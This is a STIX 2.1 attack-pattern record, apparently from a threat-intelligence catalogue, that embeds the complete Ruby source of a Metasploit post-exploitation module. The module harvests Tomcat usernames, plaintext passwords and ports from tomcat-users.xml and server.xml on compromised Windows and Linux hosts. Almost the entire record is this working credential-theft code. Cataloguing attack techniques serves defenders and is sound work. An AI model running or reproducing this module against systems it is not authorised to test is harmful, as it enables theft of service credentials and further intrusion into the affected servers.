{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--07e79ee2-450f-4e94-b6bd-203dc9776aed",
    "created": "2024-08-14T16:33:19.164468Z",
    "modified": "2024-08-14T16:33:19.164472Z",
    "name": "Gather Tomcat Credentials",
    "description": " This module will attempt to collect credentials from Tomcat services running on the machine.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/tomcat_gather.rb",
            "external_id": "tomcat_gather.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Services\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Gather Tomcat Credentials',\n        'Description' => %q{\n          This module will attempt to collect credentials from Tomcat services running on the machine.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Koen Riepe <koen.riepe@fox-it.com>', # Module author\n        ],\n        'Platform' => [ 'win', 'linux' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n  end\n\n  $username = []\n  $password = []\n  $port = []\n  $paths = []\n\n  def report_creds(user, pass, port)\n    return if (user.empty? || pass.empty?)\n\n    # Assemble data about the credential objects we will be creating\n    credential_data = {\n      origin_type: :session,\n      post_reference_name: fullname,\n      private_data: pass,\n      private_type: :password,\n      session_id: session_db_id,\n      username: user,\n      workspace_id: myworkspace_id\n    }\n\n    credential_core = create_credential(credential_data)\n\n    if !port.is_a? Integer\n      port = 8080\n      print_status(\"Port not an Integer, defaulting to port #{port} for creds database\")\n    end\n\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      address: ::Rex::Socket.getaddress(session.sock.peerhost, true),\n      port: port,\n      service_name: 'Tomcat',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n    create_credential_login(login_data)\n  end\n\n  def gatherwin\n    print_status('Windows OS detected, enumerating services')\n    tomcatHomeArray = []\n    service_list.each do |service|\n      if service[:name].downcase.include? 'tomcat'\n        print_good('Tomcat service found')\n        tomcatHomeArray.push(service_info(service[:name])[:path].split('\\\\bin\\\\')[0])\n      end\n    end\n\n    if !tomcatHomeArray.empty?\n      tomcatHomeArray.each do |tomcat_home|\n        if tomcat_home.include? '\"'\n          tomcat_home = tomcat_home.split('\"')[1]\n        end\n\n        conf_path = \"#{tomcat_home}\\\\conf\\\\tomcat-users.xml\"\n\n        if exist?(conf_path)\n          print_status(\"#{conf_path} found!\")\n          xml = read_file(conf_path).split(\"\\n\")\n\n          comment_block = false\n          xml.each do |line|\n            if line.include?('<user username=') && !comment_block\n              $username.push(line.split('<user username=\"')[1].split('\"')[0])\n              $password.push(line.split('password=\"')[1].split('\"')[0])\n              $paths.push(conf_path)\n            elsif line.include?('<!--')\n              comment_block = true\n            elsif line.include?(('-->')) && comment_block\n              comment_block = false\n            end\n          end\n        end\n\n        port_path = \"#{tomcat_home}\\\\conf\\\\server.xml\"\n        if exist?(port_path)\n          xml = read_file(port_path).split(\"\\n\")\n        end\n        comment_block = false\n        xml.each do |line|\n          if line.include?('<Connector') && !comment_block\n            i = 0\n            while i < $username.count\n              $port.push(line.split('<Connector port=\"')[1].split('\"')[0].to_i)\n              i += 1\n            end\n          elsif line.include?('<!--')\n            comment_block = true\n          elsif line.include?(('-->')) && comment_block\n            comment_block = false\n          end\n        end\n      end\n    else\n      print_status('No Tomcat home can be determined')\n    end\n  end\n\n  def gathernix\n    print_status('Unix OS detected')\n    user_files = cmd_exec('locate tomcat-users.xml').split(\"\\n\")\n    if !user_files.empty?\n      user_files.each do |path|\n        next unless exist?(path)\n\n        print_status(\"#{path} found\")\n        begin\n          xml = read_file(path).split(\"\\n\")\n          comment_block = false\n          xml.each do |line|\n            if line.include?('<user username=') && !comment_block\n              $username.push(line.split('<user username=\"')[1].split('\"')[0])\n              $password.push(line.split('password=\"')[1].split('\"')[0])\n              $paths.push(path)\n            elsif line.include?('<!--')\n              comment_block = true\n            elsif line.include?(('-->')) && comment_block\n              comment_block = false\n            end\n          end\n        rescue StandardError\n          print_error(\"Cannot open #{path} you probably don't have permission to open the file or parsing failed\")\n        end\n      end\n    else\n      print_status('No tomcat installation has been detected')\n    end\n\n    port_path = cmd_exec('locate server.xml').split(\"\\n\")\n    if !port_path.empty?\n      port_path.each do |path|\n        next unless exist?(path) && path.include?('tomcat')\n\n        print_status(\"Attempting to extract Tomcat listening ports from #{path}\")\n        begin\n          xml = read_file(path).split(\"\\n\")\n          comment_block = false\n          xml.each do |line|\n            if line.include?('<Connector') && !comment_block\n              i = 0\n              while i < $username.count\n                $port.push(line.split('<Connector port=\"')[1].split('\"')[0].to_i)\n                i += 1\n              end\n            elsif line.include?('<!--')\n              comment_block = true\n            elsif line.include?(('-->')) && comment_block\n              comment_block = false\n            end\n          end\n        rescue StandardError\n          print_status(\"Cannot open #{path} you probably don't have permission to open the file or parsing failed\")\n        end\n      end\n    else\n      print_status('Failed to detect tomcat service port')\n    end\n  end\n\n  def run\n    if sysinfo\n      if sysinfo['OS'].include? 'Windows'\n        gatherwin\n      else\n        gathernix\n      end\n    else\n      print_error('Incompatible session type, sysinfo is not available.')\n    end\n\n    if $username.empty?\n      print_status('No user credentials have been found')\n    end\n\n    i = 0\n    while i < $username.count\n      print_good(\"Username and password found in #{$paths[i]} - #{$username[i]}:#{$password[i]}\")\n      report_creds($username[i], $password[i], $port[i])\n      i += 1\n    end\n\n    $username = []\n    $password = []\n    $port = []\n    $paths = []\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win', 'linux' ]"
    ]
}